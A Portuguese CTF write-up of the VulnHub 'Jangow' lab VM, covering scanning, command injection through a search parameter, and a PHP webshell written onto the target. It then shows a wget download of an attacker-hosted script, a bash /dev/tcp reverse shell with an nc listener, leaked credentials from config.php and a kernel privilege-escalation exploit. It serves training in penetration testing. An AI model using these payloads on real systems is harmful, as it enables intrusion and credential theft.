# jangow
VulnHub Jangow WriteUp<br>
https://www.vulnhub.com/entry/jangow-101,754/

Adicione o endereço IP do alvo no arquivo hosts para que seu SO resolva o nome "jangow"



<h2>⇒ Scanning </h2>

Escaneando as portas do alvo:

~~~
nmap -sC -sV -vv -oA quick jangow -oN nmap-all.txt
~~~

~~~
# Nmap 7.92 scan initiated Tue Nov  2 12:06:03 2021 as: nmap -sC -sV -vv -oA quick -oN nmap-all.txt jangow
Nmap scan report for jangow (192.168.122.127)
Host is up, received arp-response (0.00066s latency).
Scanned at 2021-11-02 12:06:04 -04 for 14s
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 403 Forbidden
MAC Address: 52:54:00:36:85:5E (QEMU virtual NIC)
Service Info: Host: 127.0.0.1; OS: Unix
~~~


<h2>⇒ Enumeração </h2>
 WEB Port 80:

~~~
dirb http://jangow:80 /usr/share/dirb/wordlists/big.txt | tee dirb80.txt
~~~

Output:
~~~
URL_BASE: http://jangow:80/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://jangow:80/ ----
+ http://jangow:80/server-status (CODE:403|SIZE:271)                           
==> DIRECTORY: http://jangow:80/site/                                          
                                                                               
---- Entering directory: http://jangow:80/site/ ----
==> DIRECTORY: http://jangow:80/site/assets/                                   
==> DIRECTORY: http://jangow:80/site/css/                                      
==> DIRECTORY: http://jangow:80/site/js/                                       
==> DIRECTORY: http://jangow:80/site/wordpress/                                
                                                                               
---- Entering directory: http://jangow:80/site/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://jangow:80/site/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://jangow:80/site/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://jangow:80/site/wordpress/ ----
                                                                               
-----------------
END_TIME: Mon Nov 15 10:19:22 2021
DOWNLOADED: 61374 - FOUND: 1
~~~



~~~
whatweb http://jangow
~~~ 
Output:
~~~
http://jangow [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.122.127], Index-Of, Title[Index of /]
~~~


~~~
nikto -h jangow
~~~
Output:
~~~
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.122.127
+ Target Hostname:    jangow
+ Target Port:        80
+ Start Time:         2021-11-15 22:17:38 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: /: Directory indexing found.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /./: Directory indexing found.
+ /./: Appending '/./' to a directory allows indexing
+ OSVDB-3268: //: Directory indexing found.
+ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
+ OSVDB-3268: /%2e/: Directory indexing found.
+ OSVDB-576: /%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
+ OSVDB-3268: ///: Directory indexing found.
+ OSVDB-119: /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
+ OSVDB-119: /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
+ OSVDB-3268: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
+ OSVDB-3288: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when  /'s are requested.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7681 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2021-11-15 22:18:35 (GMT-4) (57 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

~~~


 FTP Port 21:

~~~
nmap -p 21 -A -sV -sC jangow
~~~

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
MAC Address: 52:54:00:36:85:5E (QEMU virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.65 ms jangow (192.168.122.127)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds
~~~

~~~
nmap -p 21 --script ftp-* jangow
~~~
Output:
~~~
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-02 20:27 -04
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for jangow (192.168.122.127)
Host is up (0.00065s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 3550 guesses in 603 seconds, average tps: 5.7
MAC Address: 52:54:00:36:85:5E (QEMU virtual NIC)

~~~



<h2>⇒ (Exploração/Ataque) </h2> 

![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/url_expl.png)

Flag User:<br>
![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/flag_user.png)


http://jangow/site/busque.php?buscar=cat%20/home/jangow01/user.txt


Listando o conteúdo do diretório, foi encontrado um arquivo “config.php” com possíveis credenciais:
![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/list_dir.png)



Para tentar ler este arquivo:

Criar um arquivo shell.php:

~~~
<?php
// Para usar use:
// http://siete.com.br/arquivo1.php?host=www.google.com.br;ls -l

exec("ping -c 4 " . $_GET['host'], $output);
echo "<pre>";
print_r($output);
echo "</pre>";
?>
~~~



Injetar o shell.php no alvo:

~~~
http://jangow/site/busque.php?buscar=echo '<?php exec("ping -c 4 " . $_GET['host'], $output);echo "<pre>";print_r($output);echo "</pre>";?>' > shell.php
~~~




Executar no browser:
~~~
http://jangow/site/shell.php?host=localhost;cat wordpress/config.php 2\>\&1 /dev/null           
~~~
![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_shell.png)

Encontramos a seguinte credencial:

<b>
login desafio02 <br>
pass  abygurl69 <br>
</b>
<p>




<h3>Porta de saída no alvo:</h3>
Devido às tentativas de estabelecer um shell reverso sem sucesso, e a possível existência de firewall devido à constatação da aplicação “ufw” no sistema, vamos verificar a existência de uma porta de saída no alvo:

Para isso, vamos colocar o nosso host para escutar as principais portas ao mesmo tempo:

~~~
nano listen.py
~~~ 
~~~
#!/usr/bin/python3

from twisted.internet import reactor
from twisted.web import resource, server

class MyResource(resource.Resource):
    isLeaf = True
    def render_GET(self, request):
        return 'gotten'

site = server.Site(MyResource())

reactor.listenTCP(23, site)
reactor.listenTCP(25, site)
reactor.listenTCP(53, site)
reactor.listenTCP(80, site)
reactor.listenTCP(110, site)
reactor.listenTCP(138, site)
reactor.listenTCP(139, site)
reactor.listenTCP(161, site)
reactor.listenTCP(389, site)
reactor.listenTCP(443, site)
reactor.listenTCP(445, site)
reactor.listenTCP(3128, site)

reactor.run()

~~~



Agora, no navegador, vamos executar o telnet no alvo, usando um laço de repetição para testar todas as portas:

~~~
http://jangow/site/busque.php?buscar=echo 'QUIT' | for i in $(seq 1 1024); do echo "Porta $i ==>"; timeout --signal=9 2 telnet jangow $i;echo "Porta $i <=="; done; 

~~~


A porta 443 aceita a saída de conexão:

![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_telnet.png)




Crie um arquivo para executar o Shell reverso no nosso alvo:
~~~
nano remote
~~~
Conteúdo:<br>
Obs: substitua o IP 192.168.122.138 pelo seu endereço
~~~
/bin/bash -i > /dev/tcp/192.168.122.138/443 0<&1 2>&1

~~~





Abrir o listen no seu host no para disponibilizar o script para o alvo (há diversas formas para tal, use a criatividade):
~~~
python3 -m http.server 443
~~~
No navegador, baixar o arquivo no alvo:

~~~
http://jangow/site/busque.php?buscar=wget http://192.168.122.138:443/remote

~~~



Aguardar o shell:
~~~
nc -lnvp 443
~~~

No navegador, executar o reverse shell:

~~~
http://jangow/site/busque.php?buscar=bash remote

~~~
![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_reverse_shell.png)




<h2>⇒ Escalação de Privilégio </h2> 

Upgrade de shell e entrar como usuário jangow01:
~~~
python3 -c 'import pty; pty.spawn("/bin/sh")'
~~~
![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_upgrade_shell.png)


Procurando por files com suid habilitado:

![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_find_suid.png)


Executando o scanner de vulnerabilidades linpeas (https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), encontrei o seguinte:
![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_linpeas.png)



Download do exploit:
~~~bash
searchsploit -m 40871 
~~~

Basta agora copiar o exploit no alvo, compilar com o gcc e executar.<br>
Então, após executar o exploit:

![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_priv_esc.png)


Flag de root:

~~~
root@jangow01:~# cat /root/proof.txt
~~~
![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/root_flag.png)